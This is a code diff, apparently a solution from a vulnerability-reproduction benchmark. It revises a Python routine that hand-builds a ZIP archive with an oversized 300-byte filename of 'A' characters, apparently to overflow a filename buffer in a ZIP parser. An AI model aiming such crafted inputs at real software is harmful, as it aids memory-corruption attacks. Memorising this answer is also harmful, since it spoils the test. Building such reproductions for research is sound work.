@@ -1,91 +1,79 @@
 import struct
-from typing import Optional
+import zlib
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        fname_len = 257
-        fname = b"A" * fname_len
+        filename_len = 300
+        filename = b"A" * filename_len
+        data = b""
+        crc32 = zlib.crc32(data) & 0xFFFFFFFF
 
-        # Local file header
-        local_sig = 0x04034B50
-        version_needed = 20
-        gp_flag = 0
-        comp_method = 0
+        local_header_sig = 0x04034B50
+        central_header_sig = 0x02014B50
+        eocd_sig = 0x06054B50
+
+        ver_needed = 20
+        ver_made = 20
+        flags = 0
+        compression = 0
         mod_time = 0
         mod_date = 0
-        crc32 = 0
-        comp_size = 0
-        uncomp_size = 0
-        extra = b""
+        comp_size = len(data)
+        uncomp_size = len(data)
+        fname_len = len(filename)
+        extra_len = 0
 
-        local_hdr = struct.pack(
+        local_header = struct.pack(
             "<IHHHHHIIIHH",
-            local_sig,
-            version_needed,
-            gp_flag,
-            comp_method,
+            local_header_sig,
+            ver_needed,
+            flags,
+            compression,
             mod_time,
             mod_date,
             crc32,
             comp_size,
             uncomp_size,
             fname_len,
-            len(extra),
-        ) + fname + extra
+            extra_len,
+        ) + filename
 
-        file_data = b""
-
-        # Central directory header
-        cd_sig = 0x02014B50
-        version_made_by = 20
-        file_comment = b""
-        disk_start = 0
-        internal_attr = 0
-        external_attr = 0
-        local_hdr_offset = 0
-
-        central_dir = struct.pack(
+        local_offset = 0
+        central_header = struct.pack(
             "<IHHHHHHIIIHHHHHII",
-            cd_sig,
-            version_made_by,
-            version_needed,
-            gp_flag,
-            comp_method,
+            central_header_sig,
+            ver_made,
+            ver_needed,
+            flags,
+            compression,
             mod_time,
             mod_date,
             crc32,
             comp_size,
             uncomp_size,
             fname_len,
-            0,  # extra len
-            0,  # comment len
-            disk_start,
-            internal_attr,
-            external_attr,
-            local_hdr_offset,
-        ) + fname + file_comment
+            0,  # extra field length
+            0,  # file comment length
+            0,  # disk number start
+            0,  # internal file attributes
+            0,  # external file attributes
+            local_offset,
+        ) + filename
 
-        # End of central directory
-        eocd_sig = 0x06054B50
-        disk_no = 0
-        cd_start_disk = 0
-        entries_this_disk = 1
-        total_entries = 1
-        cd_size = len(central_dir)
-        cd_offset = len(local_hdr) + len(file_data)
-        zip_comment = b""
+        cd_offset = len(local_header) + len(data)
+        cd_size = len(central_header)
 
         eocd = struct.pack(
             "<IHHHHIIH",
             eocd_sig,
-            disk_no,
-            cd_start_disk,
-            entries_this_disk,
-            total_entries,
+            0,  # number of this disk
+            0,  # number of the disk with the start of the central directory
+            1,  # total entries on this disk
+            1,  # total entries
             cd_size,
             cd_offset,
-            len(zip_comment),
-        ) + zip_comment
+            0,  # zip file comment length
+        )
 
-        return local_hdr + file_data + central_dir + eocd
+        return local_header + data + central_header + eocd
